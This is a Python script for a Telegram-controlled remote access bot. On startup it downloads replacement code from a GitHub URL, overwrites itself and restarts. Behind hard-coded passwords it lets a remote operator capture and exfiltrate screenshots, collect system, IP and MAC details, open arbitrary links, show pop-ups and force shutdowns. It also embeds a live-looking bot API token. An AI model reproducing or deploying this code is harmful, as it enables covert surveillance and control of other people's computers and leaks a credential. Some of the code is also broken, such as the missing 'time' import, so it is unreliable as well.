import os
import sys
import telebot
import tempfile
from PIL import ImageGrab
import requests
import webbrowser
import urllib.parse
import pyautogui
from PIL import Image, ImageDraw
import psutil
import platform
import socket


PASTEBIN_URL = 'https://raw.githubusercontent.com/MrGoose000/piskapophui/refs/heads/main/main.py'
CURRENT_FILE = sys.argv[0]

def check_for_updates():
    try:
        response = requests.get(PASTEBIN_URL)
        if response.status_code == 200:
            new_code = response.text

            with open(CURRENT_FILE, 'r', encoding='utf-8') as f:
                current_code = f.read()

            if new_code != current_code:
                with open(CURRENT_FILE, 'w', encoding='utf-8') as f:
                    f.write(new_code)

                print('Updated. Restarting...')
                os.execv(sys.executable, ['python'] + sys.argv)
            else:
                print('Already up to date')
        else:
            print('Error downloading from GitHub')
    except Exception as e:
        print(f'Update check error: {e}')


check_for_updates()

API_TOKEN = '6721960274:AAGWzhZpHRyKfN9LomOcv8so6lpjvRCmkCw'
bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, 'Enter password:')
    bot.register_next_step_handler(message, check_password)

def check_password(message):
    password = message.text.strip()
    if password == '11,41653494676972':
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("Get screenshot")
        markup.add("Open link")
        markup.add("Show IP")
        markup.add("Krila ptashka")
        markup.add("Collapse all windows")
        markup.add("Write a message")
        markup.add("Info about PC")
        bot.send_message(message.chat.id, 'Hi! Select action:', reply_markup=markup)
    elif password == 'sigma_pass_dlya_krutih228111111':
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("Get screenshot")
        markup.add("Turn off")
        markup.add("Open link")
        markup.add("Show IP")
        markup.add("Krila ptashka")
        markup.add("Collapse all windows")
        markup.add("Write a message")
        markup.add("Info about PC")
        markup.add("Turn off? Yes")
        bot.send_message(message.chat.id, 'Hi! Select action:', reply_markup=markup)
    else:
        bot.send_message(message.chat.id, 'Incorrect password. Try again.')
        send_welcome(message)

@bot.message_handler(regexp='Turn off? Yes')
def force_shutdown(message):
    result = pyautogui.confirm(text='Shut down?', title='Confirmation', buttons=['Yes', 'Yes'])

    if not result or result == 'Yes':
        os.system("shutdown -s -t 3")
        pyautogui.alert("3")
        time.sleep(1)
        pyautogui.alert("2")
        time.sleep(1)
        pyautogui.alert("1")
        pass

@bot.message_handler(regexp='Info about PC')
def system_info(message):
    bot.send_message(message.chat.id, 'Gathering system info...')

    system_info = f"System: {platform.system()} {platform.release()}\n"
    system_info += f"Python version: {platform.python_version()}\n"
    system_info += f"Architecture: {platform.architecture()[0]}\n"
    system_info += f"Hostname: {platform.node()}\n"
    system_info += f"Processor: {platform.processor()}\n"
    
    gpu_info = "GPU: "
    try:
        import wmi
        w = wmi.WMI()
        for gpu in w.Win32_VideoController():
            gpu_info += f"{gpu.name}, "
    except:
        gpu_info += "Info not available"
    system_info += gpu_info[:-2] + "\n" 
    
    memory_info = f"RAM: {round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB\n"
    
    system_info += memory_info

    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        mac_address = ':'.join(['{:02x}'.format((psutil.net_if_addrs()[interface][0].address).split(':')[i]) for i in range(6)])
        network_info = f"IP Address: {ip_address}\nMAC Address: {mac_address}\n"
    except:
        network_info = "Network info not available\n"
    system_info += network_info
    
    bot.send_message(message.chat.id, system_info)


@bot.message_handler(regexp='Write a message')
def send_message_dialog(message):
    bot.send_message(message.chat.id, "Enter your message:")
    bot.register_next_step_handler(message, send_message)

def send_message(message):
    bot.send_message(message.chat.id, f"You wrote: {message.text}")
    msg = message.text
    pyautogui.alert(message.text)

@bot.message_handler(regexp='Krila ptashka')
def krila(message):
    krila_url = 'https://youtu.be/-9PfcqY5jQc?si=3dRFqaH-YjzuncOi'
    bot.send_message(message.chat.id, "Playing...")
    webbrowser.open(krila_url)

@bot.message_handler(regexp='Turn off')
def echo_message(message):
    bot.send_message(message.chat.id, "Shutting down...")
    os.system("shutdown -s -t 0")

@bot.message_handler(regexp='Get screenshot')
def echo_message(message):
    path = tempfile.gettempdir() + 'screenshot.png'
    screenshot = ImageGrab.grab()
    screenshot.save(path, 'PNG')
    bot.send_message(message.chat.id, "Taking screenshot...")
    bot.send_photo(message.chat.id, open(path, 'rb'))

@bot.message_handler(regexp='Show IP')
def get_ip_address(message):
    bot.send_message(message.chat.id, "Fetching IP address...")
    ip_address = requests.get('https://api.ipify.org').text
    bot.send_message(message.chat.id, f"Your IP address: {ip_address}")

@bot.message_handler(regexp='Collapse all windows')
def collapse_windows(message):
    bot.send_message(message.chat.id, "Collapsing windows...")
    bot.send_message(message.chat.id, "All windows collapsed")
    os.system("explorer.exe shell:::{3080F90D-D7AD-11D9-BD98-0000947B0257}")

@bot.message_handler(func=lambda message: True)
def open_link(message):
    url = message.text.strip()
    if not url.startswith('http'):
        bot.send_message(message.chat.id, 'Link must start with https://(and the link here).')
        return
    parsed_url = urllib.parse.urlparse(url)
    if not (parsed_url.scheme and parsed_url.netloc):
        bot.send_message(message.chat.id, 'This does not seem like a link.')
        return

    excluded_domains = [
        'kekma.net', 'pornhub.com', 'xvideos.com', 'brazzers.com', 'redtube.com', 'tube8.com', 'xhamster.com', 'youjizz.com'
        # Add other excluded domains here
    ]
    if any(parsed_url.netloc.lower().endswith(domain) for domain in excluded_domains):
        bot.send_message(message.chat.id, 'Sorry, but opening links from certain domains is prohibited.')
    else:
        bot.send_message(message.chat.id, f'Opening link: {url}')
        webbrowser.open(url)

bot.polling(none_stop=True)
